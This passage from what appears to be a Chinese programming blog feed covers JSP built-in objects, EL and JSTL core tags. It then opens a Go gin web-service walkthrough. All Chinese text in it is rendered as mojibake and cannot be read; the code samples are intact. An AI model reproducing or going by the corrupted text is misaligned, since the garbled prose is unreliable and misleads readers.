<h3 id="5-9å¤§å†…ç½®å¯¹è±¡"><a href="#5-9å¤§å†…ç½®å¯¹è±¡" class="headerlink" title="5.9å¤§å†…ç½®å¯¹è±¡"></a>5.9å¤§å†…ç½®å¯¹è±¡</h3><ul>
<li>PageContext    å­˜ä¸œè¥¿</li>
<li>Request     å­˜ä¸œè¥¿</li>
<li>Response</li>
<li>Session      å­˜ä¸œè¥¿</li>
<li>Application   ã€SerlvetContextã€‘   å­˜ä¸œè¥¿</li>
<li>config    ã€SerlvetConfigã€‘</li>
<li>out</li>
<li>page ï¼Œä¸ç”¨äº†è§£</li>
<li>exception</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%--å†…ç½®å¯¹è±¡--%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    pageContext.setAttribute(<span class="string">&quot;name1&quot;</span>,<span class="string">&quot;å¤©å¯1å·&quot;</span>); <span class="comment">// ä¿å­˜çš„æ•°æ®åªåœ¨ä¸€ä¸ªé¡µé¢ä¸­æœ‰æ•ˆ</span></span><br><span class="line">    request.setAttribute(<span class="string">&quot;name2&quot;</span>,<span class="string">&quot;å¤©å¯2å·&quot;</span>); <span class="comment">// ä¿å­˜çš„æ•°æ®åªåœ¨ä¸€æ¬¡è¯·æ±‚ä¸­æœ‰æ•ˆï¼Œè¯·æ±‚è½¬å‘ä¼šæºå¸¦è¿™ä¸ªæ•°æ®</span></span><br><span class="line">    session.setAttribute(<span class="string">&quot;name3&quot;</span>,<span class="string">&quot;å¤©å¯3å·&quot;</span>); <span class="comment">// ä¿å­˜çš„æ•°æ®åªåœ¨ä¸€æ¬¡ä¼šè¯ä¸­æœ‰æ•ˆï¼Œä»æ‰“å¼€æµè§ˆå™¨åˆ°å…³é—­æµè§ˆå™¨</span></span><br><span class="line">    application.setAttribute(<span class="string">&quot;name4&quot;</span>,<span class="string">&quot;å¤©å¯4å·&quot;</span>);  <span class="comment">// ä¿å­˜çš„æ•°æ®åªåœ¨æœåŠ¡å™¨ä¸­æœ‰æ•ˆï¼Œä»æ‰“å¼€æœåŠ¡å™¨åˆ°å…³é—­æœåŠ¡å™¨</span></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--</span><br><span class="line">    è„šæœ¬ç‰‡æ®µä¸­çš„ä»£ç ï¼Œä¼šè¢«åŸå°ä¸åŠ¨ç”Ÿæˆåˆ°.jsp.java</span><br><span class="line">    è¦æ±‚ï¼šè¿™é‡Œé¢çš„ä»£ç ï¼Œå¿…é¡»ä¿è¯Javaè¯­æ³•çš„æ­£ç¡®æ€§</span><br><span class="line">--%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">// ä»pageContentå–å‡ºï¼Œæˆ‘ä»¬é€šè¿‡å¯»æ‰¾çš„æ–¹å¼æ¥</span></span><br><span class="line">    <span class="comment">// ä»åº•å±‚åˆ°é«˜å±‚ï¼ˆä½œç”¨åŸŸï¼‰:</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">name1</span> <span class="operator">=</span> (String) pageContext.findAttribute(<span class="string">&quot;name1&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name2</span> <span class="operator">=</span> (String) pageContext.findAttribute(<span class="string">&quot;name2&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name3</span> <span class="operator">=</span> (String) pageContext.findAttribute(<span class="string">&quot;name3&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name4</span> <span class="operator">=</span> (String) pageContext.findAttribute(<span class="string">&quot;name4&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">name5</span> <span class="operator">=</span> (String) pageContext.findAttribute(<span class="string">&quot;name5&quot;</span>); <span class="comment">// ä½œç”¨åŸŸ</span></span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--ä½¿ç”¨ELè¡¨è¾¾å¼è¾“å‡º $&#123;&#125; --%&gt;</span><br><span class="line">&lt;h1&gt;å–å‡ºçš„å€¼:&lt;/h1&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name1&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name2&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name3&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt;$&#123;name4&#125;&lt;/h3&gt;</span><br><span class="line">&lt;h3&gt; &lt;%=name5%&gt; &lt;/h3&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¦‚æœELè¡¨è¾¾å¼ä¸ç”Ÿæ•ˆï¼Œè¯·åœ¨JSPé¡µé¢æœ€ä¸Šé¢åŠ ä¸Šï¼š&lt;%@page isELIgnored&#x3D;â€falseâ€ %&gt;</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/21638d6fda0959ab9123bd789f459dea--1446--image-20241020183424440.png" alt="image-20241020183424440"></p>
<ul>
<li>requestï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œäº§ç”Ÿçš„æ•°æ®ï¼Œç”¨æˆ·çœ‹å®Œå°±æ²¡ç”¨äº†ï¼Œæ¯”å¦‚ï¼šæ–°é—»ï¼Œç”¨æˆ·çœ‹å®Œæ²¡ç”¨çš„ï¼</li>
<li>sessionï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œäº§ç”Ÿçš„æ•°æ®ï¼Œç”¨æˆ·ç”¨å®Œä¸€ä¼šè¿˜æœ‰ç”¨ï¼Œæ¯”å¦‚ï¼šè´­ç‰©è½¦ï¼›</li>
<li>applicationï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œäº§ç”Ÿçš„æ•°æ®ï¼Œä¸€ä¸ªç”¨æˆ·ç”¨å®Œäº†ï¼Œå…¶ä»–ç”¨æˆ·è¿˜å¯èƒ½ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼šèŠå¤©æ•°æ®ï¼›</li>
</ul>
<h3 id="6-JSPæ ‡ç­¾-JSTLæ ‡ç­¾-ELè¡¨è¾¾å¼"><a href="#6-JSPæ ‡ç­¾-JSTLæ ‡ç­¾-ELè¡¨è¾¾å¼" class="headerlink" title="6.JSPæ ‡ç­¾.JSTLæ ‡ç­¾.ELè¡¨è¾¾å¼"></a>6.JSPæ ‡ç­¾.JSTLæ ‡ç­¾.ELè¡¨è¾¾å¼</h3><ul>
<li>ELè¡¨è¾¾å¼ï¼š  ${ }<ul>
<li><strong>è·å–æ•°æ®</strong></li>
<li><strong>æ‰§è¡Œè¿ç®—</strong></li>
<li><strong>è·å–webå¼€å‘çš„å¸¸ç”¨å¯¹è±¡</strong></li>
</ul>
</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;!-- JSTLè¡¨è¾¾å¼çš„ä¾èµ– --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;javax.servlet.jsp.jstl&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;jstl-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;!-- standardæ ‡ç­¾åº“ --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;taglibs&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;standard&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">1.1</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>JSPæ ‡ç­¾</strong></p>
</li>
<li><p>jspTag.jsp</p>
</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;jspTag&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Tag1&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--jsp:include--%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--</span><br><span class="line">http:<span class="comment">//localhost:8080/Jsp/jspTag.jsp?name=subeily&amp;age=18</span></span><br><span class="line">--%&gt;</span><br><span class="line"></span><br><span class="line">&lt;jsp:forward page=<span class="string">&quot;/jspTag2.jsp&quot;</span>&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;name&quot;</span> value=<span class="string">&quot;subeiLY&quot;</span>/&gt;</span><br><span class="line">    &lt;jsp:param name=<span class="string">&quot;age&quot;</span> value=<span class="string">&quot;18&quot;</span>/&gt;</span><br><span class="line">&lt;/jsp:forward&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>jspTag2.jsp</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;jspTag2&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1&gt;Tag2&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--å–å‡ºå‚æ•°--%&gt;</span><br><span class="line">    </span><br><span class="line">åå­—:&lt;%=request.getParameter(<span class="string">&quot;name&quot;</span>)%&gt;</span><br><span class="line">å¹´é¾„:&lt;%=request.getParameter(<span class="string">&quot;age&quot;</span>)%&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://www.runoob.com/jsp/jsp-jstl.html"><strong>JSTLè¡¨è¾¾å¼</strong></a><ul>
<li>JSTLæ ‡ç­¾åº“çš„ä½¿ç”¨å°±æ˜¯ä¸ºäº†å¼¥è¡¥HTMLæ ‡ç­¾çš„ä¸è¶³ï¼›å®ƒè‡ªå®šä¹‰è®¸å¤šæ ‡ç­¾ï¼Œå¯ä»¥ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼Œæ ‡ç­¾çš„åŠŸèƒ½å’ŒJavaä»£ç ä¸€æ ·ï¼</li>
</ul>
</li>
<li><strong>æ ¼å¼åŒ–æ ‡ç­¾</strong></li>
<li><strong>SQLæ ‡ç­¾</strong></li>
<li><strong>XML æ ‡ç­¾</strong></li>
<li><strong>æ ¸å¿ƒæ ‡ç­¾</strong> ï¼ˆæŒæ¡éƒ¨åˆ†ï¼‰</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-20/6735274c191f54e070ccc111214cafa4--9647--image-20241020184405012.png" alt="image-20241020184405012"></p>
<ul>
<li><p><strong>JSTLæ ‡ç­¾åº“ä½¿ç”¨æ­¥éª¤</strong>ï¼š</p>
<ul>
<li>å¼•å…¥å¯¹åº”çš„ taglibï¼›</li>
<li>ä½¿ç”¨å…¶ä¸­çš„æ–¹æ³•ï¼›</li>
<li><strong>åœ¨Tomcat çš„libç›®å½•ä¸‹ä¹Ÿéœ€è¦å¼•å…¥ jstl-api-1.2.jarã€standard-1.1.2.jarçš„åŒ…ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼šJSTLè§£æé”™è¯¯</strong>ï¼›</li>
</ul>
</li>
<li><p>cï¼šif</p>
</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%--å¼•å…¥jstlæ ¸å¿ƒæ ‡ç­¾åº“--%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;core-<span class="keyword">if</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;h4&gt;<span class="keyword">if</span>æµ‹è¯•&lt;/h4&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;core-if.jsp&quot;</span> method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    &lt;%--</span><br><span class="line">        ELè¡¨è¾¾å¼è·å–è¡¨å•ä¸­çš„æ•°æ®</span><br><span class="line">        $&#123;param.å‚æ•°å&#125;</span><br><span class="line">    --%&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span> value=<span class="string">&quot;$&#123;param.username&#125;&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ç™»å½•&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--åˆ¤æ–­å¦‚æœæäº¤çš„ç”¨æˆ·åæ˜¯ç®¡ç†å‘˜ï¼Œåˆ™ç™»å½•æˆåŠŸ--%&gt;</span><br><span class="line">&lt;c:<span class="keyword">if</span> test=<span class="string">&quot;$&#123;param.username==&#x27;admin&#x27;&#125;&quot;</span> <span class="keyword">var</span>=<span class="string">&quot;isAdmin&quot;</span>&gt;</span><br><span class="line">    &lt;c:out value=<span class="string">&quot;ç®¡ç†å‘˜æ¬¢è¿æ‚¨ï¼&quot;</span>/&gt;</span><br><span class="line">&lt;/c:<span class="keyword">if</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--è‡ªé—­åˆæ ‡ç­¾--%&gt;</span><br><span class="line">&lt;c:out value=<span class="string">&quot;$&#123;isAdmin&#125;&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>c:choose   c:when</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%--å¼•å…¥jstlæ ¸å¿ƒæ ‡ç­¾åº“--%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;core-<span class="keyword">for</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--å®šä¹‰ä¸€ä¸ªå˜é‡scoreï¼Œå€¼ä¸º<span class="number">85</span>--%&gt;</span><br><span class="line">&lt;c:set <span class="keyword">var</span>=<span class="string">&quot;score&quot;</span> value=<span class="string">&quot;65&quot;</span>/&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:choose&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;score&gt;=90&#125;&quot;</span>&gt;</span><br><span class="line">        ä½ çš„æˆç»©ä¸ºä¼˜ç§€</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;score&gt;=80&#125;&quot;</span>&gt;</span><br><span class="line">        ä½ çš„æˆç»©ä¸ºä¸€èˆ¬</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;score&gt;=70&#125;&quot;</span>&gt;</span><br><span class="line">        ä½ çš„æˆç»©ä¸ºè‰¯å¥½</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">    &lt;c:when test=<span class="string">&quot;$&#123;score&lt;=60&#125;&quot;</span>&gt;</span><br><span class="line">        ä½ çš„æˆç»©ä¸ºä¸åŠæ ¼</span><br><span class="line">    &lt;/c:when&gt;</span><br><span class="line">&lt;/c:choose&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>c:forEach</li>
</ul>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> %&gt;</span><br><span class="line">&lt;%--å¼•å…¥jstlæ ¸å¿ƒæ ‡ç­¾åº“--%&gt;</span><br><span class="line">&lt;%@ taglib prefix=<span class="string">&quot;c&quot;</span> uri=<span class="string">&quot;http://java.sun.com/jsp/jstl/core&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;core-foreach&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    ArrayList&lt;String&gt; people = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    people.add(<span class="number">0</span>,<span class="string">&quot;å¼ ä¸‰&quot;</span>);</span><br><span class="line">    people.add(<span class="number">1</span>,<span class="string">&quot;æå››&quot;</span>);</span><br><span class="line">    people.add(<span class="number">2</span>,<span class="string">&quot;ç‹äº”&quot;</span>);</span><br><span class="line">    people.add(<span class="number">3</span>,<span class="string">&quot;èµµå…­&quot;</span>);</span><br><span class="line">    people.add(<span class="number">4</span>,<span class="string">&quot;ç”°å…­&quot;</span>);</span><br><span class="line">    request.setAttribute(<span class="string">&quot;list&quot;</span>,people);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%--</span><br><span class="line"><span class="keyword">var</span> , æ¯ä¸€æ¬¡éå†å‡ºæ¥çš„å˜é‡</span><br><span class="line">items, è¦éå†çš„å¯¹è±¡</span><br><span class="line">begin,   å“ªé‡Œå¼€å§‹</span><br><span class="line">end,     åˆ°å“ªé‡Œ</span><br><span class="line">step,   æ­¥é•¿</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;c:forEach <span class="keyword">var</span>=<span class="string">&quot;people&quot;</span> items=<span class="string">&quot;$&#123;list&#125;&quot;</span>&gt;</span><br><span class="line">    &lt;c:out value=<span class="string">&quot;$&#123;people&#125;&quot;</span>/&gt; &lt;br&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br><span class="line"></span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line">&lt;c:forEach <span class="keyword">var</span>=<span class="string">&quot;people&quot;</span> items=<span class="string">&quot;$&#123;list&#125;&quot;</span> begin=<span class="string">&quot;1&quot;</span> end=<span class="string">&quot;3&quot;</span> step=<span class="string">&quot;1&quot;</span> &gt;</span><br><span class="line">    &lt;c:out value=<span class="string">&quot;$&#123;people&#125;&quot;</span>/&gt; &lt;br&gt;</span><br><span class="line">&lt;/c:forEach&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h2 id="å…­ã€JavaBean"><a href="#å…­ã€JavaBean" class="headerlink" title="å…­ã€JavaBean"></a>å…­ã€JavaBean</h2>]]></content>
  </entry>
  <entry>
    <title>å­—èŠ‚è®­ç»ƒè¥å­¦ä¹ è®°å½•</title>
    <url>/2024/11/08/%E5%AD%97%E8%8A%82%E8%AE%AD%E7%BB%83%E8%90%A5%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>æœ¬ç¯‡æ–‡ç« ä¸»è¦è®°å½•åœ¨é’è®­è¥Xè±†åŒ…MarsCode æŠ€æœ¯è®­ç»ƒè¥åç«¯goè¯­è¨€å­¦ä¹ çš„ä¸€äº›ç»å†ä¸è¿‡ç¨‹ã€‚</p>
<span id="more"></span>

<h1 id="ä¸€ã€é’è®­è¥Xè±†åŒ…MarsCode-æŠ€æœ¯è®­ç»ƒè¥ä¹‹ç®€æ˜“å‘å¸–é¡¹ç›®è®°å½•"><a href="#ä¸€ã€é’è®­è¥Xè±†åŒ…MarsCode-æŠ€æœ¯è®­ç»ƒè¥ä¹‹ç®€æ˜“å‘å¸–é¡¹ç›®è®°å½•" class="headerlink" title="ä¸€ã€é’è®­è¥Xè±†åŒ…MarsCode æŠ€æœ¯è®­ç»ƒè¥ä¹‹ç®€æ˜“å‘å¸–é¡¹ç›®è®°å½•"></a>ä¸€ã€é’è®­è¥Xè±†åŒ…MarsCode æŠ€æœ¯è®­ç»ƒè¥ä¹‹ç®€æ˜“å‘å¸–é¡¹ç›®è®°å½•</h1><p>â€‹	é¦–å…ˆå°±æ˜¯è¿™æ¬¡æ–‡ç« æ˜¯æ€ä¹ˆæ¥çš„ï¼Œæ˜¯å› ä¸ºåœ¨è®­ç»ƒè¥ä¸­çœ‹åˆ°äº†ç¬¬å››è¯¾ï¼Œè®²çš„æ˜¯Goè¯­è¨€å·¥ç¨‹å®è·µä»¥åŠå¯¹åº”ä½¿ç”¨çš„ginæ¡†æ¶ï¼Œä½†æ˜¯å‘ç°é¡¹ç›®å…¨å¥—ä»£ç æ˜¯æœ‰äº†ï¼Œä½†æ˜¯å´æ²¡æœ‰åˆ†æ®µçš„å¯¹åº”ä»£ç ï¼Œåº”è¯¥æ˜¯åè¾¹è¯¾ç¨‹è®²çš„ä½†æ˜¯æ²¡åœ¨æ­¤æ¬¡è®­ç»ƒè¥çš„è¯¾ç¨‹è¡¨ä¸­å—ï¼Œæ‰€ä»¥åœ¨æ­¤ä¹Ÿæ˜¯æ ¹æ®è‡ªå·±çš„ç†è§£å¯¹è¯¥é¡¹ç›®è¿›è¡Œä¸€å®šçš„è®°å½•å­¦ä¹ ã€‚å¹¶ä¸”ï¼Œç”±äºæ˜¯ç›´æ¥å¯¹äºä¸€ä¸ªé¡¹ç›®è¿›è¡Œåˆ†æçš„ï¼Œå°±ä¸è¿‡å¤šå¯¹äºç†è®ºéƒ¨åˆ†è¿›è¡Œè®²è§£äº†ã€‚</p>
<h2 id="1ã€Ginæ¡†æ¶ã€‚"><a href="#1ã€Ginæ¡†æ¶ã€‚" class="headerlink" title="1ã€Ginæ¡†æ¶ã€‚"></a>1ã€Ginæ¡†æ¶ã€‚</h2><p>â€‹	ginæ¡†æ¶ä¹Ÿæ˜¯goä¸­çš„ä¸€ä¸ªæœ€å¸¸è§çš„æ¡†æ¶äº†ï¼Œèƒ½å¤Ÿè®©æˆ‘ä»¬å¿«é€Ÿçš„å¯åŠ¨ä¸€äº›httpæœåŠ¡ï¼Œéå¸¸çš„æ–¹ä¾¿å¿«æ·ã€‚è¿™é‡Œä¹Ÿå°±ä¸å¤šä»‹ç»äº†ï¼Œæœ¬ç¯‡æ–‡ç« çš„ä¾§é‡ç‚¹æ˜¯é¡¹ç›®åˆ†æï¼Œè¿™ä¸ªä¹Ÿä¸æ˜¯å¾ˆéš¾ï¼Œå¯ä»¥ç›´æ¥çœ‹å®˜æ–¹æ–‡æ¡£å³å¯ã€‚<a href="https://gin-gonic.com/zh-cn/docs/quickstart/">https://gin-gonic.com/zh-cn/docs/quickstart/</a></p>
<h2 id="2ã€é¡¹ç›®ç»“æ„"><a href="#2ã€é¡¹ç›®ç»“æ„" class="headerlink" title="2ã€é¡¹ç›®ç»“æ„"></a>2ã€é¡¹ç›®ç»“æ„</h2><p>é¦–å…ˆå°±æ˜¯æˆ‘ä»¬å¯ä»¥å»åˆ†æä¸€ä¸‹é¡¹ç›®çš„ç»“æœï¼Œè¿™é‡Œæˆ‘å°†ç»™çš„é¡¹ç›®ä¸­çš„ä¸€äº›æµ‹è¯•ä»¥åŠçŸ¥è¯†ç‚¹ä»£ç éƒ½å»æ‰äº†ï¼Œå‰©ä¸‹äº†è¿™äº›ä»£ç ï¼Œå¹¶ä¸”å…¶ä¸­serviceæ˜¯ç”¨æ¥æµ‹è¯•é¡¹ç›®åŠŸèƒ½çš„</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20241110123533028.png" alt="image-20241110123533028"></p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±æ˜¯å¯¹è¿™äº›ä»£ç è¿›è¡Œç†è§£ã€‚</p>
<p>é¦–å…ˆå°±æ˜¯å¯åŠ¨é¡¹ï¼Œserver.go</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;gopkg.in/gin-gonic/gin.v1&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="comment">//&quot;github.com/Moonlight-Zhao/go-project-example/handler&quot;</span></span><br><span class="line">	<span class="comment">//&quot;github.com/Moonlight-Zhao/go-project-example/repository&quot;</span></span><br><span class="line">	<span class="string">&quot;test01/server/handler&quot;</span></span><br><span class="line">	<span class="string">&quot;test01/server/repository&quot;</span></span><br><span class="line">	<span class="string">&quot;test01/server/util&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := Init(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		os.Exit(<span class="number">-1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	r := gin.Default()</span><br><span class="line"></span><br><span class="line">	r.Use(gin.Logger())</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/ping&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, gin.H&#123;</span><br><span class="line">			<span class="string">&quot;message&quot;</span>: <span class="string">&quot;pong&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.GET(<span class="string">&quot;/community/page/get/:id&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		topicId := c.Param(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">		data := handler.QueryPageInfo(topicId)</span><br><span class="line">		c.JSON(<span class="number">200</span>, data)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	r.POST(<span class="string">&quot;/community/post/do&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		uid, _ := c.GetPostForm(<span class="string">&quot;uid&quot;</span>)</span><br><span class="line">		topicId, _ := c.GetPostForm(<span class="string">&quot;topic_id&quot;</span>)</span><br><span class="line">		content, _ := c.GetPostForm(<span class="string">&quot;content&quot;</span>)</span><br><span class="line">		data := handler.PublishPost(uid, topicId, content)</span><br><span class="line">		c.JSON(<span class="number">200</span>, data)</span><br><span class="line">	&#125;)</span><br><span class="line"></span><br><span class="line">	err := r.Run(<span class="string">&quot;:8081&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := repository.Init(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err := util.InitLogger(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å°±æ˜¯å¯ä»¥å‘ç°è¿™æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„å¯åŠ¨æœåŠ¡</p>
